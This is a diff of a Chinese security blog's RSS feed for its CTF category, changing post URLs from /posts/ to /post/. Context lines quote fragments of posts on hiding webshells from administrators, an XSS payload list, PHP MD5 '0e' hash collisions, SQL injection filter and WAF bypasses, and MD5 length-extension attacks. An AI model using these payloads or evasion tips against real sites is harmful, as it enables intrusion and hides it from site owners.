@@ -1,4 +1,4 @@
-<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>ctf - 分类 - zu1k</title><link>https://lgf.im/categories/ctf/</link><description>ctf - 分类 - zu1k</description><generator>Hugo -- gohugo.io</generator><managingEditor>i@lgf.im (zu1k)</managingEditor><webMaster>i@lgf.im (zu1k)</webMaster><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Sat, 08 Aug 2020 09:21:59 +0000</lastBuildDate><atom:link href="https://lgf.im/categories/ctf/" rel="self" type="application/rss+xml"/><item><title>如何优雅的隐藏你的Webshell</title><link>https://lgf.im/posts/security/web-security/hide-your-webshell/</link><pubDate>Sat, 08 Aug 2020 09:21:59 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/hide-your-webshell/</guid><description><![CDATA[<blockquote>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>ctf - 分类 - zu1k</title><link>https://lgf.im/categories/ctf/</link><description>ctf - 分类 - zu1k</description><generator>Hugo -- gohugo.io</generator><managingEditor>i@lgf.im (zu1k)</managingEditor><webMaster>i@lgf.im (zu1k)</webMaster><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Sat, 08 Aug 2020 09:21:59 +0000</lastBuildDate><atom:link href="https://lgf.im/categories/ctf/" rel="self" type="application/rss+xml"/><item><title>如何优雅的隐藏你的Webshell</title><link>https://lgf.im/post/security/web-security/hide-your-webshell/</link><pubDate>Sat, 08 Aug 2020 09:21:59 +0000</pubDate><author>作者</author><guid>https://lgf.im/post/security/web-security/hide-your-webshell/</guid><description><![CDATA[<blockquote>
 <p>转自：酒仙桥六号部队 <a href="https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug">https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug</a>
 这个公众号的文章质量都非常高，推荐大家关注</p>
 </blockquote>
@@ -359,7 +359,7 @@
 <p>在有权限的情况,看看管理员是否写的有动态webshell监测脚本,务必把脚本找出来,crontab一般都能看见了</p>
 </li>
 </ol>
-]]></description></item><item><title>xss payload</title><link>https://lgf.im/posts/security/web-security/xss-payload/</link><pubDate>Sun, 14 Oct 2018 18:11:03 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/xss-payload/</guid><description><![CDATA[<p>总结了常用的xss payload</p>
+]]></description></item><item><title>xss payload</title><link>https://lgf.im/post/security/web-security/xss-payload/</link><pubDate>Sun, 14 Oct 2018 18:11:03 +0000</pubDate><author>作者</author><guid>https://lgf.im/post/security/web-security/xss-payload/</guid><description><![CDATA[<p>总结了常用的xss payload</p>
 <p>1.普通的XSS JavaScript注入</p>
 <pre><code>&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;
 </code></pre>
@@ -487,7 +487,7 @@
 <pre><code>&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert('XSS')&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
 </code></pre>
 <p>40.IMG VBscript</p>
-<pre><code>&lt;IMG SRC='vbscript:msgbox(&quot;XSS&quot;)'&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</code></pre>]]></description></item><item><title>md5缺陷0e</title><link>https://lgf.im/posts/security/web-security/md5-compare-0e/</link><pubDate>Sun, 14 Oct 2018 18:09:46 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/md5-compare-0e/</guid><description><![CDATA[<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
+<pre><code>&lt;IMG SRC='vbscript:msgbox(&quot;XSS&quot;)'&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</code></pre>]]></description></item><item><title>md5缺陷0e</title><link>https://lgf.im/post/security/web-security/md5-compare-0e/</link><pubDate>Sun, 14 Oct 2018 18:09:46 +0000</pubDate><author>作者</author><guid>https://lgf.im/post/security/web-security/md5-compare-0e/</guid><description><![CDATA[<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
 <p>关于PHP hash比较缺陷详细介绍：http://www.freebuf.com/news/67007.html</p>
 <pre><code>0x01 md5(str)
  
@@ -604,7 +604,7 @@ s878926199a
   
 0x03 md5(md5(str).&quot;SALT&quot;)
 2
-0e774261293712168181959463563504</code></pre>]]></description></item><item><title>sql注入针对关键字过滤的绕过技巧</title><link>https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</link><pubDate>Sun, 14 Oct 2018 18:07:45 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</guid><description><![CDATA[<p>在sql注入中经常会遇到服务端针对注入关键字进行过滤，经过查询各种文章，总结了一部分绕过的方法。</p>
+0e774261293712168181959463563504</code></pre>]]></description></item><item><title>sql注入针对关键字过滤的绕过技巧</title><link>https://lgf.im/post/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</link><pubDate>Sun, 14 Oct 2018 18:07:45 +0000</pubDate><author>作者</author><guid>https://lgf.im/post/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</guid><description><![CDATA[<p>在sql注入中经常会遇到服务端针对注入关键字进行过滤，经过查询各种文章，总结了一部分绕过的方法。</p>
 <blockquote>
 <p>2020.08.08更新：增加利用MySQL8.0语法新特性绕过方法，增加sql注入过滤和检测的几种思路和绕过方法</p>
 </blockquote>
@@ -1040,7 +1040,7 @@ s878926199a
 </div><h3 id="语义分析">语义分析</h3>
 <p>这是最高级的方式，模仿mysql对sql的分析，waf对用户的输入进行语法语义分析，如果符合mysql的语法，就判断为sql注入从而阻断</p>
 <p>这种防护的绕过思路就是找特殊的语法，这些特殊语法waf可能没有覆盖全面，从而导致waf语义分析失败，从而进行绕过</p>
-<p>例如我们上面说的mysql8的tables和values语句就是比较新的语法，有很多waf还米有覆盖到</p>]]></description></item><item><title>MD5的Hash长度扩展攻击</title><link>https://lgf.im/posts/security/crypto/md5-hash-length-extension-attack/</link><pubDate>Sun, 14 Oct 2018 17:53:03 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/crypto/md5-hash-length-extension-attack/</guid><description><![CDATA[<h2 id="一遇到的问题">一、遇到的问题</h2>
+<p>例如我们上面说的mysql8的tables和values语句就是比较新的语法，有很多waf还米有覆盖到</p>]]></description></item><item><title>MD5的Hash长度扩展攻击</title><link>https://lgf.im/post/security/crypto/md5-hash-length-extension-attack/</link><pubDate>Sun, 14 Oct 2018 17:53:03 +0000</pubDate><author>作者</author><guid>https://lgf.im/post/security/crypto/md5-hash-length-extension-attack/</guid><description><![CDATA[<h2 id="一遇到的问题">一、遇到的问题</h2>
 <p>在一道web题目中遇到了以下判断:
 <code>if ($COOKIE[&quot;md5hash&quot;] === md5($secret . $input))</code></p>
 <p>在该题目中我们可以掌握的参数有<code>md5hash</code>、<code>input</code>的值，<code>secret</code>的md5值和长度，我们需要想办法让这个判断通过。</p>
